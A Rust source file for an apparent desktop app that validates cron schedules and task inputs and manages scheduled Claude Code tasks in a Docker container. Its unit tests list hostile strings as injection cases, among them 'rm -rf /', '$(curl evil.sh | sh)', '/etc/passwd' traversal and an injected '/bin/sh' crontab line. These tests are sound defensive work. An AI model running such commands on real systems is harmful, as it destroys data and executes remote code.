/// One cron field's shape: its human name, its numeric bounds, and the
/// three-letter aliases it accepts (`JAN…DEC`, `SUN…SAT`).
struct CronField {
    label: &'static str,
    min: u32,
    max: u32,
    names: &'static [&'static str],
    /// Numeric value of `names[0]` (1 for January, 0 for Sunday).
    name_base: u32,
}

const MONTH_NAMES: [&str; 12] = [
    "jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec",
];
const DOW_NAMES: [&str; 7] = ["sun", "mon", "tue", "wed", "thu", "fri", "sat"];

/// Bounds match Debian/vixie cron, which is what the container runs: day of
/// week accepts both 0 and 7 for Sunday, and month/day-of-week accept names.
const CRON_FIELDS: [CronField; 5] = [
    CronField { label: "minute", min: 0, max: 59, names: &[], name_base: 0 },
    CronField { label: "hour", min: 0, max: 23, names: &[], name_base: 0 },
    CronField { label: "day of month", min: 1, max: 31, names: &[], name_base: 0 },
    CronField { label: "month", min: 1, max: 12, names: &MONTH_NAMES, name_base: 1 },
    CronField { label: "day of week", min: 0, max: 7, names: &DOW_NAMES, name_base: 0 },
];

/// Largest `/step` accepted. Cron itself tolerates a step wider than the field
/// (`*/61` is legal, it just means "once"), so this only fences off absurdity.
const MAX_CRON_STEP: u32 = 1_000;

fn cron_value(field: &CronField, token: &str) -> Result<u32, String> {
    if !token.is_empty() && token.chars().all(|c| c.is_ascii_digit()) {
        // `token` is all digits; a long run of them would overflow, so bound it
        // before parsing rather than after.
        let value = token
            .parse::<u32>()
            .map_err(|_| format!("{:?} is out of range for the {} field.", token, field.label))?;
        if value < field.min || value > field.max {
            return Err(format!(
                "{:?} is out of range for the {} field ({}–{}).",
                token, field.label, field.min, field.max
            ));
        }
        return Ok(value);
    }

    let lowered = token.to_ascii_lowercase();
    if let Some(index) = field.names.iter().position(|n| *n == lowered) {
        return Ok(index as u32 + field.name_base);
    }

    Err(format!(
        "{:?} is not valid in the {} field.",
        token, field.label
    ))
}

/// One comma-separated element of a cron field: `*`, `5`, `1-5`, `*/10`,
/// `1-5/2`, or a name. A step is only legal after `*` or a range — vixie cron
/// rejects `1/2`, so accepting it here would produce a crontab it refuses.
fn validate_cron_element(field: &CronField, element: &str) -> Result<(), String> {
    if element.is_empty() {
        return Err(format!("Empty value in the {} field.", field.label));
    }

    let (base, step) = match element.split_once('/') {
        Some((base, step)) => (base, Some(step)),
        None => (element, None),
    };

    if let Some(step) = step {
        if step.is_empty() || step.len() > 4 || !step.chars().all(|c| c.is_ascii_digit()) {
            return Err(format!(
                "{:?} in the {} field: a step must be a number, like */5.",
                element, field.label
            ));
        }
        let step: u32 = step.parse().unwrap_or(0);
        if step == 0 || step > MAX_CRON_STEP {
            return Err(format!(
                "{:?} in the {} field: a step must be between 1 and {}.",
                element, field.label, MAX_CRON_STEP
            ));
        }
        if base != "*" && !base.contains('-') {
            return Err(format!(
                "{:?} in the {} field: a step can only follow * or a range, like */5 or 1-5/2.",
                element, field.label
            ));
        }
    }

    if base == "*" {
        return Ok(());
    }
    match base.split_once('-') {
        Some((from, to)) => {
            cron_value(field, from)?;
            cron_value(field, to)?;
        }
        None => {
            cron_value(field, base)?;
        }
    }
    Ok(())
}

/// Validate a cron expression and return it normalised to exactly five fields
/// separated by single spaces.
///
/// Two reasons this runs host-side instead of trusting the container:
///
/// 1. The scheduler does **not** validate the expression. It writes the task
///    JSON, then rebuilds the whole crontab and pipes it to `crontab`, which
///    rejects the *entire file* if any single line is malformed — and the
///    rebuild swallows that error (`|| true`). One bad expression therefore
///    silently unschedules every other task in the container. Verified against
///    the real CLI.
/// 2. The normalised return value is what gets sent onward, so no newline the
///    user typed can reach a crontab line.
fn validate_cron_expression(expression: &str) -> Result<String, String> {
    if expression.len() > MAX_CRON_LEN {
        return Err(format!(
            "Cron expression is too long (max {} characters).",
            MAX_CRON_LEN
        ));
    }
    let fields: Vec<&str> = expression.split_whitespace().collect();
    if fields.len() != 5 {
        return Err(format!(
            "A cron schedule needs exactly 5 fields (minute hour day-of-month month day-of-week); got {}.",
            fields.len()
        ));
    }

    for (spec, field) in CRON_FIELDS.iter().zip(fields.iter()) {
        for element in field.split(',') {
            validate_cron_element(spec, element)?;
        }
    }

    Ok(fields.join(" "))
}

/// Validate the one-shot `--at` timestamp.
///
/// The scheduler matches `^[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}$` and
/// converts it to a cron expression, so the shape is checked strictly here
/// (chrono's `%m` would happily accept a one-digit month the scheduler will
/// reject) and chrono is used only to reject impossible dates like `02-30`.
fn validate_at_timestamp(at: &str) -> Result<String, String> {
    let at = at.trim();
    let well_formed = at.len() == 16
        && at.as_bytes().iter().enumerate().all(|(i, b)| match i {
            4 | 7 => *b == b'-',
            10 => *b == b' ',
            13 => *b == b':',
            _ => b.is_ascii_digit(),
        });
    if !well_formed {
        return Err(format!(
            "One-shot time must look like \"YYYY-MM-DD HH:MM\"; got {:?}.",
            at
        ));
    }
    chrono::NaiveDateTime::parse_from_str(at, "%Y-%m-%d %H:%M")
        .map_err(|_| format!("{:?} is not a real date and time.", at))?;
    Ok(at.to_string())
}

fn validate_task_input(
    name: &str,
    prompt: &str,
    kind: ScheduleKind,
    schedule: &str,
    working_dir: Option<&str>,
) -> Result<ValidatedTaskInput, String> {
    Ok(ValidatedTaskInput {
        name: validate_task_name(name)?,
        prompt: validate_task_prompt(prompt)?,
        kind,
        schedule: match kind {
            ScheduleKind::Recurring => validate_cron_expression(schedule)?,
            ScheduleKind::Once => validate_at_timestamp(schedule)?,
        },
        working_dir: validate_working_dir(working_dir)?,
    })
}

/// Pull the new task's id out of `add`'s output block, which starts:
///
/// ```text
/// Task created:
///   ID:       a1b2c3d4
///   Name:     …
/// ```
///
/// The first `ID:` line wins (the echoed prompt comes later and could contain
/// anything), and the result still has to pass [`validate_task_id`].
fn parse_created_task_id(output: &str) -> Option<String> {
    output
        .lines()
        .find_map(|line| line.trim().strip_prefix("ID:"))
        .map(|value| value.trim().to_string())
        .filter(|id| validate_task_id(id).is_ok())
}

// ── Mutating scheduler commands ──────────────────────────────────────────────
//
// These delegate to `triple-c-scheduler`'s own subcommands (which also rebuild
// the crontab) instead of editing its JSON, and each runs as a bare argv vector
// with a validated id.

/// Create a task via the scheduler's `add`, returning the new task's id.
#[tauri::command]
pub async fn add_scheduled_task(
    project_id: String,
    name: String,
    prompt: String,
    schedule_kind: ScheduleKind,
    schedule: String,
    working_dir: Option<String>,
    state: State<'_, AppState>,
) -> Result<String, String> {
    let input = validate_task_input(
        &name,
        &prompt,
        schedule_kind,
        &schedule,
        working_dir.as_deref(),
    )?;
    let container_id = require_running_container(&project_id, &state).await?;

    let output = run_scheduler(&container_id, input.add_args()).await?;
    let task_id = parse_created_task_id(&output).ok_or_else(|| {
        format!(
            "The scheduler did not report a task id. Its output was: {}",
            output.trim()
        )
    })?;

    log::info!(
        "Added scheduler task {} ({:?}) in project {}",
        task_id,
        input.name,
        project_id
    );
    Ok(task_id)
}

/// Replace an existing task with an edited copy, returning the **new** task id.
///
/// `triple-c-scheduler` has no `edit`/`update` subcommand — its subcommands are
/// add / remove / enable / disable / list / logs / run / notifications — and
/// hand-editing its task JSON from here would bypass the crontab rebuild that
/// every one of those does. So an edit is `add` followed by `remove`:
///
/// * **In that order**, so a rejected `add` leaves the original untouched
///   rather than deleting a prompt the user cannot get back. The cost is a
///   sub-second window in which both tasks are in the crontab.
/// * The task therefore gets a **new id**. Its old log directory
///   (`~/.claude/scheduler/logs/<old-id>/`) stays behind under the old id; the
///   UI warns about this before saving.
/// * `enabled` is carried over explicitly, because `add` always creates an
///   enabled task and silently re-enabling a task the user had switched off
///   would schedule a run they did not ask for.
#[tauri::command]
pub async fn update_scheduled_task(
    project_id: String,
    task_id: String,
    name: String,
    prompt: String,
    schedule_kind: ScheduleKind,
    schedule: String,
    working_dir: Option<String>,
    enabled: Option<bool>,
    state: State<'_, AppState>,
) -> Result<String, String> {
    validate_task_id(&task_id)?;
    let input = validate_task_input(
        &name,
        &prompt,
        schedule_kind,
        &schedule,
        working_dir.as_deref(),
    )?;
    let container_id = require_running_container(&project_id, &state).await?;

    let output = run_scheduler(&container_id, input.add_args()).await?;
    let new_id = parse_created_task_id(&output).ok_or_else(|| {
        format!(
            "The scheduler did not report a task id, so the original task was left in place. Its output was: {}",
            output.trim()
        )
    })?;

    run_scheduler(
        &container_id,
        vec!["remove".to_string(), "--id".to_string(), task_id.clone()],
    )
    .await
    .map_err(|e| {
        format!(
            "Saved the edited task as {}, but could not remove the original {}: {} — remove it by hand or both will run.",
            new_id, task_id, e
        )
    })?;

    if enabled == Some(false) {
        if let Err(e) = run_scheduler(
            &container_id,
            vec!["disable".to_string(), "--id".to_string(), new_id.clone()],
        )
        .await
        {
            // The edit itself succeeded; the list refresh will show the task as
            // enabled, which is visible rather than silent.
            log::warn!("Could not re-disable edited task {}: {}", new_id, e);
        }
    }

    log::info!(
        "Updated scheduler task {} → {} in project {}",
        task_id,
        new_id,
        project_id
    );
    Ok(new_id)
}

/// Enable or disable a task via the scheduler's `enable` / `disable`.
#[tauri::command]
pub async fn set_scheduled_task_enabled(
    project_id: String,
    task_id: String,
    enabled: bool,
    state: State<'_, AppState>,
) -> Result<String, String> {
    validate_task_id(&task_id)?;
    let container_id = require_running_container(&project_id, &state).await?;

    let subcommand = if enabled { "enable" } else { "disable" };
    let output = run_scheduler(
        &container_id,
        vec![subcommand.to_string(), "--id".to_string(), task_id],
    )
    .await?;
    Ok(output.trim().to_string())
}

/// Trigger a task immediately via the scheduler's `run`.
///
/// The run itself invokes Claude Code and can take minutes, so the exec is
/// started **detached**: Docker keeps it alive after this call returns and the
/// UI is not blocked. Progress shows up through `get_scheduled_task_log` /
/// `get_scheduler_notifications`, exactly as for a cron-triggered run.
#[tauri::command]
pub async fn run_scheduled_task_now(
    project_id: String,
    task_id: String,
    state: State<'_, AppState>,
) -> Result<String, String> {
    validate_task_id(&task_id)?;
    let container_id = require_running_container(&project_id, &state).await?;

    let docker = get_docker()?;
    let exec = docker
        .create_exec(
            &container_id,
            CreateExecOptions {
                attach_stdout: Some(false),
                attach_stderr: Some(false),
                // Argv vector — no shell, so `task_id` is inert as data.
                cmd: Some(vec![
                    "triple-c-scheduler".to_string(),
                    "run".to_string(),
                    "--id".to_string(),
                    task_id.clone(),
                ]),
                env: Some(home_env()),
                user: Some("claude".to_string()),
                working_dir: Some("/workspace".to_string()),
                ..Default::default()
            },
        )
        .await
        .map_err(|e| format!("Failed to create exec: {}", e))?;

    docker
        .start_exec(
            &exec.id,
            Some(StartExecOptions {
                detach: true,
                ..Default::default()
            }),
        )
        .await
        .map_err(|e| format!("Failed to start task: {}", e))?;

    log::info!(
        "Triggered scheduler task {} in project {} (detached exec {})",
        task_id,
        project_id,
        exec.id
    );
    Ok(format!("Task {} started.", task_id))
}

/// Remove a task via the scheduler's `remove` (which also rebuilds the crontab).
#[tauri::command]
pub async fn remove_scheduled_task(
    project_id: String,
    task_id: String,
    state: State<'_, AppState>,
) -> Result<String, String> {
    validate_task_id(&task_id)?;
    let container_id = require_running_container(&project_id, &state).await?;

    let output = run_scheduler(
        &container_id,
        vec!["remove".to_string(), "--id".to_string(), task_id],
    )
    .await?;
    Ok(output.trim().to_string())
}

/// Clear all pending notifications via the scheduler's `notifications --clear`.
#[tauri::command]
pub async fn clear_scheduler_notifications(
    project_id: String,
    state: State<'_, AppState>,
) -> Result<(), String> {
    let container_id = require_running_container(&project_id, &state).await?;
    run_scheduler(
        &container_id,
        vec!["notifications".to_string(), "--clear".to_string()],
    )
    .await?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn task_id_allowlist_accepts_scheduler_generated_ids() {
        assert!(validate_task_id("a1b2c3d4").is_ok());
        assert!(validate_task_id("00000000").is_ok());
        assert!(validate_task_id("task_1-a").is_ok());
    }

    #[test]
    fn task_id_allowlist_rejects_injection_and_traversal() {
        for bad in [
            "",
            "a b",
            "a;rm -rf /",
            "a$(id)",
            "a`id`",
            "a|b",
            "a&b",
            "a>b",
            "a'b",
            "a\"b",
            "a\nb",
            "../../etc/passwd",
            "a/b",
            "a.json",
            "-id",
            "--id",
            &"a".repeat(65),
        ] {
            assert!(
                validate_task_id(bad).is_err(),
                "should have rejected {:?}",
                bad
            );
        }
    }

    #[test]
    fn session_id_allowlist_accepts_uuids_only() {
        assert!(validate_session_id("e13d312d-2f38-4cf6-b0e0-1db60208a74c").is_ok());
        assert!(validate_session_id("zzzz").is_err());
        assert!(validate_session_id("abc; rm -rf /").is_err());
        assert!(validate_session_id("-abc").is_err());
        assert!(validate_session_id("").is_err());
    }

    #[test]
    fn parse_or_default_degrades_on_garbage() {
        let v: Vec<RawSession> = parse_or_default("not json", "test");
        assert!(v.is_empty());
        let v: Vec<RawSession> = parse_or_default("   ", "test");
        assert!(v.is_empty());
        let caps: ContainerCapabilities = parse_or_default("{}", "test");
        assert_eq!(caps.skills.count, 0);
    }

    #[test]
    fn epoch_to_iso_is_rfc3339() {
        assert!(epoch_to_iso(0).starts_with("1970-01-01T00:00:00"));
    }

    // ── Task creation ────────────────────────────────────────────────────────

    fn recurring(name: &str, prompt: &str) -> Result<ValidatedTaskInput, String> {
        validate_task_input(name, prompt, ScheduleKind::Recurring, "*/30 * * * *", None)
    }

    /// The whole injection story: a prompt full of shell syntax is carried
    /// through as one argv element, byte for byte, with nothing escaped or
    /// stripped — because nothing downstream is a shell.
    #[test]
    fn shell_metacharacters_survive_as_one_argv_element() {
        for hostile in [
            "; rm -rf /",
            "$(id)",
            "`id`",
            "$(curl evil.sh | sh)",
            "x\"; rm -rf / #",
            "x' ; rm -rf / ; '",
            "line one\nline two\n; rm -rf /",
            "a | b & c > d < e",
            "${HOME}/../etc/passwd",
            "%injected",
        ] {
            let input = recurring("nightly", hostile).expect("prompt is data, not syntax");
            assert_eq!(input.prompt, hostile);

            let args = input.add_args();
            // Exactly one element equals the hostile string, and it is the one
            // straight after `--prompt`.
            let at = args.iter().position(|a| a == "--prompt").unwrap();
            assert_eq!(args[at + 1], hostile, "prompt must be its own argv element");
            assert_eq!(
                args.iter().filter(|a| a.contains("rm -rf")).count(),
                usize::from(hostile.contains("rm -rf")),
                "no other argv element should have absorbed the payload"
            );
            // No shell ever appears in the command line we build.
            assert!(!args.iter().any(|a| a == "sh" || a == "-c" || a == "bash"));
        }
    }

    #[test]
    fn add_args_are_flag_value_pairs_in_the_schedulers_own_spelling() {
        let input = validate_task_input(
            "nightly tests",
            "Run the suite",
            ScheduleKind::Recurring,
            "0 3 * * *",
            Some("/workspace/triple-c"),
        )
        .unwrap();
        assert_eq!(
            input.add_args(),
            vec![
                "add",
                "--name",
                "nightly tests",
                "--prompt",
                "Run the suite",
                "--schedule",
                "0 3 * * *",
                "--working-dir",
                "/workspace/triple-c",
            ]
        );

        let once = validate_task_input(
            "one shot",
            "Commit",
            ScheduleKind::Once,
            "2026-12-25 09:05",
            None,
        )
        .unwrap();
        assert_eq!(
            once.add_args()[5..],
            ["--at", "2026-12-25 09:05", "--working-dir", "/workspace"]
        );
    }

    #[test]
    fn task_name_rejects_option_lookalikes_and_control_characters() {
        assert!(validate_task_name("-id").is_err());
        assert!(validate_task_name("--prompt").is_err());
        assert!(validate_task_name("").is_err());
        assert!(validate_task_name("   ").is_err());
        assert!(validate_task_name("two\nlines").is_err());
        assert!(validate_task_name("tab\there").is_err());
        assert!(validate_task_name("nul\0byte").is_err());
        assert!(validate_task_name(&"n".repeat(MAX_TASK_NAME_LEN + 1)).is_err());

        // A name is free text otherwise; metacharacters are inert as argv.
        assert_eq!(validate_task_name("  nightly; rm -rf /  ").unwrap(), "nightly; rm -rf /");
        assert_eq!(validate_task_name("$(id)").unwrap(), "$(id)");
        assert_eq!(validate_task_name(&"n".repeat(MAX_TASK_NAME_LEN)).unwrap().len(), MAX_TASK_NAME_LEN);
    }

    #[test]
    fn task_prompt_allows_newlines_but_not_nul_or_novels() {
        assert_eq!(
            validate_task_prompt("first\nsecond\ttabbed").unwrap(),
            "first\nsecond\ttabbed"
        );
        assert!(validate_task_prompt("").is_err());
        assert!(validate_task_prompt("  \n ").is_err());
        assert!(validate_task_prompt("bad\0nul").is_err());
        assert!(validate_task_prompt(&"p".repeat(MAX_TASK_PROMPT_LEN + 1)).is_err());
    }

    #[test]
    fn working_dir_must_be_absolute() {
        assert_eq!(validate_working_dir(None).unwrap(), "/workspace");
        assert_eq!(validate_working_dir(Some("  ")).unwrap(), "/workspace");
        assert_eq!(validate_working_dir(Some("/workspace/app")).unwrap(), "/workspace/app");

        for bad in [
            "workspace",
            "./workspace",
            "~/workspace",
            "-/workspace",
            "/workspace/../etc",
            "/work\nspace",
            "/work\0space",
        ] {
            assert!(
                validate_working_dir(Some(bad)).is_err(),
                "should have rejected {:?}",
                bad
            );
        }
        assert!(validate_working_dir(Some(&format!("/{}", "d".repeat(MAX_WORKING_DIR_LEN)))).is_err());
    }

    #[test]
    fn cron_accepts_real_expressions() {
        for good in [
            "* * * * *",
            "*/30 * * * *",
            "0 3 * * *",
            "0 9 * * 1-5",
            "0,30 9-17 * * 1-5",
            "15 0 1 1 *",
            "0 9 * * 0",
            // vixie cron takes 7 as Sunday, and three-letter names.
            "0 9 * * 7",
            "0 9 * * MON-FRI",
            "0 0 1 JAN *",
            "0 0 1 jan sun",
            // A step wider than the field is legal; it just means "once".
            "0-59/70 * * * *",
            "1-5/2 * * * *",
            "05 09 * * *",
        ] {
            assert!(
                validate_cron_expression(good).is_ok(),
                "should have accepted {:?}: {:?}",
                good,
                validate_cron_expression(good)
            );
        }
    }

    #[test]
    fn cron_rejects_what_crontab_would_reject() {
        for bad in [
            "",
            "* * * *",          // four fields
            "* * * * * *",      // six
            "@daily",           // shorthand the scheduler cannot place in a line
            "not a cron",
            "99 * * * *",       // minute out of range
            "0 24 * * *",       // hour out of range
            "0 0 0 1 *",        // day-of-month is 1-based
            "0 9 * * 8",        // day-of-week is 0-7
            "0 9 * 13 *",       // month out of range
            "*/0 * * * *",      // zero step
            "1/2 * * * *",      // step without * or a range
            "0 9 * * MON-FRO",  // not a weekday
            "0 9 * * mon,",     // empty list element
            "0 9 * * ,mon",
            "0 9 * * 1--5",
            "0 9 * * 1-5/",     // empty step
            "0 9 * * 1-5/x",
            // Names only apply to their own field: no month in day-of-week,
            // and no names at all in minute/hour/day-of-month.
            "0 9 * * jan",
            "jan 9 * * *",
            "0 mon * * *",
            "0 9 * * *; rm -rf /",
            "$(id) * * * *",
            "0 9 * * *`id`",
            "99999999999999999999 * * * *",
        ] {
            assert!(
                validate_cron_expression(bad).is_err(),
                "should have rejected {:?}",
                bad
            );
        }
        assert!(validate_cron_expression(&"1 ".repeat(200)).is_err());
    }

    /// The crontab line is `<schedule> <runner> <id>`, so any whitespace the
    /// user typed has to be flattened before it can start a second line.
    #[test]
    fn cron_normalisation_flattens_whitespace_and_newlines() {
        assert_eq!(
            validate_cron_expression("  0   9  *  *  *  ").unwrap(),
            "0 9 * * *"
        );
        assert_eq!(
            validate_cron_expression("0 9 * *\n*").unwrap(),
            "0 9 * * *"
        );
        assert_eq!(validate_cron_expression("0\t9\t*\t*\t*").unwrap(), "0 9 * * *");
        // An injected extra line is extra fields, and five is five.
        assert!(validate_cron_expression("* * * * *\n* * * * * /bin/sh").is_err());

        let input =
            validate_task_input("n", "p", ScheduleKind::Recurring, "0 9 * *\n*", None).unwrap();
        assert!(!input.schedule.contains('\n'));
        assert_eq!(input.schedule, "0 9 * * *");
    }

    #[test]
    fn at_timestamp_matches_the_schedulers_own_format() {
        assert_eq!(
            validate_at_timestamp("  2026-12-25 09:05  ").unwrap(),
            "2026-12-25 09:05"
        );
        for bad in [
            "",
            "tomorrow",
            "2026-1-5 09:05",       // the scheduler's regex demands two digits
            "2026-12-25T09:05",
            "2026-12-25 09:05:00",
            "2026-13-01 09:05",
            "2026-02-30 09:05",     // not a real day
            "2026-12-25 25:00",
            "2026-12-25 09:05\n* * * * * /bin/sh",
            "$(date) 09:05",
        ] {
            assert!(
                validate_at_timestamp(bad).is_err(),
                "should have rejected {:?}",
                bad
            );
        }
    }

    #[test]
    fn created_task_id_comes_from_the_first_id_line_and_is_revalidated() {
        let output = "Task created:\n  ID:       5c2fa70d\n  Name:     nightly\n  Type:     recurring\n  Schedule: */30 * * * *\n  Prompt:   ID: not-this-one\n";
        assert_eq!(parse_created_task_id(output).as_deref(), Some("5c2fa70d"));

        assert_eq!(parse_created_task_id("").as_deref(), None);
        assert_eq!(parse_created_task_id("Task created:\n").as_deref(), None);
        // A malformed id is dropped rather than passed to a later subcommand.
        assert_eq!(parse_created_task_id("  ID:  ../../etc/passwd\n").as_deref(), None);
        assert_eq!(parse_created_task_id("  ID:  a; rm -rf /\n").as_deref(), None);
    }
}
